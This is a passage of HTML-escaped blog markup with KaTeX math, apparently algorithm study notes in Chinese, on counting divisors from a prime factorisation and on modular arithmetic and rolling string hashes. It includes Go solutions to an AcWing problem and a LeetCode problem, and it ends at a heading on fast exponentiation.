class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.16454285714285719em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.247em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;其&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;中&lt;/mi&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;的&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;约&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;数&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;为&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;：&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msubsup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msub&gt;&lt;/msubsup&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;共&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;个&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;其中p_{0}^{a_{0}}的约数为：1,p_{0},p_{0}^{2},...,p_{0}^{a_{0}}共a_{0}+1个
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1304159999999999em;vertical-align:-0.26630799999999993em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;其&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;中&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.746292em;&#34;&gt;&lt;span style=&#34;top:-2.433692em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1449em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.26630799999999993em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;约&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;为&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8641079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.113em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.247em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.746292em;&#34;&gt;&lt;span style=&#34;top:-2.433692em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.1449em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.26630799999999993em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;共&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;个&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;因&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;此&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;的&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;约&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;束&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;的&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;个&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;数&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;：&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;因此n的约束的个数：(a_{0}+1)*(a_{1}+1)*...*(a_{n}+1)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;因&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;此&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;约&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;束&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;个&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;数&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.46528em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;https://www.acwing.com/problem/content/description/872/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import &amp;quot;fmt&amp;quot;

func main() {
    var n int
    hash := make(map[int]int)
    fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;n)
    
    for i := 0; i &amp;lt; n; i++ {
        var tmp int
        fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;tmp)
        n := tmp
        for j := 2; j &amp;lt;= n / j; j++ {
            for tmp % j == 0 {
                tmp /= j
                hash[j]++
            }
        }
        if tmp &amp;gt; 1 {
            hash[tmp] ++
        }
    }
    var ans int = 1
    for _, v := range hash {
        ans = (ans * (v + 1) ) % (1e9 + 7)
    }
    fmt.Printf(&amp;quot;%d\n&amp;quot;, ans)
    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;模运算&#34;&gt;模运算&lt;/h2&gt;
&lt;h3 id=&#34;字符串哈希&#34;&gt;字符串哈希&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/find-substring-with-given-hash-value/&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1643609240761.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 反向滑动窗口，下一个窗口的前k-1个字符的字符串哈希=这一个窗口的后k-1个字符的字符串哈希值*p
func subStrHash(s string, power int, modulo int, k int, hashValue int) string {
    pk_map := make(map[int]int) // p的n次幂：pk_map[i]: p^i % m
    pk_map[0] = 1 % modulo
    for i := 1; i &amp;lt; k; i++ {
        pk_map[i] = (pk_map[i-1] * power % modulo) % modulo
    }
    ans := 0
    tmp_hv := 0
    i := len(s) - 1
    for ; i &amp;gt;= len(s) - k ; i-- {
        tmp_hv = (tmp_hv * power + int(s[i])-int(&#39;a&#39;)+1)  % modulo
    }
    if tmp_hv == hashValue {
        ans = i + 1
    }
    for ; i &amp;gt;=  0; i-- {
        tmp_hv_k := ((int(s[i+k])-int(&#39;a&#39;) + 1) * pk_map[k-1] ) % modulo
        tmp_hv = (tmp_hv - tmp_hv_k + modulo ) % modulo
        tmp_hv = (tmp_hv * power + (int(s[i])-int(&#39;a&#39;)+1)) % modulo
        if tmp_hv == hashValue {
            ans = i
        }
    }
    return s[ans: ans+k]
}
// (a + b) % p = (a % p + b % p) % p 
// (a * b) % p = (a % p * b % p) % p 
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;快速幂&#34;&gt;快速幂&lt;/h3&gt;
&lt;p&gt;https://zhuanlan.zhihu.com/p/95902286&lt;/p&gt;
